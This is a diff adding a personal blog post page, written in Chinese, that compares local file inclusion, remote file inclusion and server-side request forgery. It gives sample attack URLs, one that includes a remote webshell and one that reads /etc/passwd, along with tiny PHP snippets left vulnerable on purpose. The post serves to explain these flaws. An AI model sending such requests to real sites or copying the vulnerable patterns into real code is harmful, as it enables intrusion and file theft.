@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+    <head>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-19124306-5', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+<meta name="theme-color" content="#000000">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="stylesheet" type="text/css" href="/css/css.css">
+<link rel="stylesheet" type="text/css" href="/css/header.css">
+<link rel="stylesheet" type="text/css" href="/css/main-menu.css">
+<title>比較SSRF與LFI/RFI</title>
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML">
+</script>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.9/styles/hybrid.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+  hljs.registerLanguage("plaintext",function(e){return{disableAutodetect:!0}});
+</script>
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+</head>
+    <body><nav id="main-menu">
+    
+    
+    <a href="https://github.com/r888800009" title="">
+        <i class="fab fa-github"></i>
+        
+    </a>
+    
+    <a href="/portfolio/" title="Portfolio">
+        
+        Portfolio
+    </a>
+    
+</nav>
+<div id="main">    <h1 class="website-name"><a href="https://r888800009.github.io/" class="website-name">r809&#39;s blog</a></h1>
+<div id="content">
+    <h1><a href="https://r888800009.github.io/posts/ssrf-vs-lfi-rfi-different/" class="post-link">比較SSRF與LFI/RFI</a></h1><div class="date"> 
+        <time datetime="2019-08-14 17:34:18 &#43;0800 CST">Wed, 2019 Aug 14</time>
+    </div> 
+    <p>LFI/RFI漏洞與SSRF漏洞表徵看起來相似，探討三個漏洞的區別。</p>
+
+<h2 id="本地檔案包含">本地檔案包含</h2>
+
+<p>Local File Inclusion (LFI)，若客戶端可控制網頁包含本地文件，可能有LFI漏洞。</p>
+
+<pre><code class="language-plaintext">https://vulnerablesite.com/lfi.php?page=index.php
+</code></pre>
+
+<p>代碼</p>
+
+<pre><code class="language-php">&lt;?php
+  if (isset($_GET['page']))
+    include('php/' . $page);
+?&gt;
+</code></pre>
+
+<h2 id="遠程檔案包含">遠程檔案包含</h2>
+
+<p>Remote File Inclusion (RFI)，類似LFI漏洞但是允許包含遠程文件。</p>
+
+<pre><code class="language-plaintext">https://vulnerablesite.com/rfi.php?page=http://example.com/webshell.txt
+</code></pre>
+
+<p>代碼</p>
+
+<pre><code class="language-php">&lt;?php
+  if (isset($_GET['page']))
+    include($page);
+?&gt;
+</code></pre>
+
+<h2 id="伺服器端請求偽造">伺服器端請求偽造</h2>
+
+<p>Server-Side Request Forgery (SSRF)，透過伺服器發出各種協議的請求來執行惡意行為，並且可以控制URI如<code>http://</code>、<code>file://</code>、<code>ssh2://</code>、<code>ftp://</code>等。</p>
+
+<pre><code class="language-plaintext">https://vulnerablesite.com/ssrf.php?uri=https://example.com/img1.png
+https://vulnerablesite.com/ssrf.php?uri=file:///etc/passwd
+</code></pre>
+
+<p>代碼</p>
+
+<pre><code class="language-php">&lt;?php
+  if (isset($_GET['uri']))
+    echo file_get_contents($_GET['uri']);
+?&gt;
+
+</code></pre>
+
+<h2 id="比較">比較</h2>
+
+<p>RFI/LFI漏洞與SSRF漏洞本質上是不同的東西，RFI為包含遠程文件而SSRF為發出請求，php的<code>include</code>支援偽協議，可以執行SSRF攻擊。</p>
+
+<h2 id="參考">參考</h2>
+
+<ul>
+<li>SSRF
+<ul>
+<li><a href="https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.server_side_request_forgery#PHP">Server-Side Request Forgery</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
+</ul></li>
+<li>LFI/RFI
+<ul>
+<li><a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/">What is Local File Inclusion (LFI)?</a></li>
+<li><a href="http://wiki.secbug.net/web_lfi.html#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">本地文件包含（Local File Include）</a></li>
+</ul></li>
+<li>其他
+<ul>
+<li><a href="https://lorexxar.cn/2016/09/14/php-wei/">php 伪协议</a></li>
+<li><a href="https://security.stackexchange.com/questions/191458/what-is-the-difference-between-rfi-lfi-and-ssrf">What is the difference between RFI/LFI and SSRF?</a></li>
+</ul></li>
+</ul>
+
+            </div>
+            <hr>
+            <a href="#website-name" style="font-size: 150%; padding-left: 5px">
+                <i class="fas fa-chevron-up"></i>
+            </a>
+        </div><footer>
+    <hr>
+
+    r888800009
+    <i class="far fa-copyright"></i>
+    2019
+</footer>
+</body>
+</html>
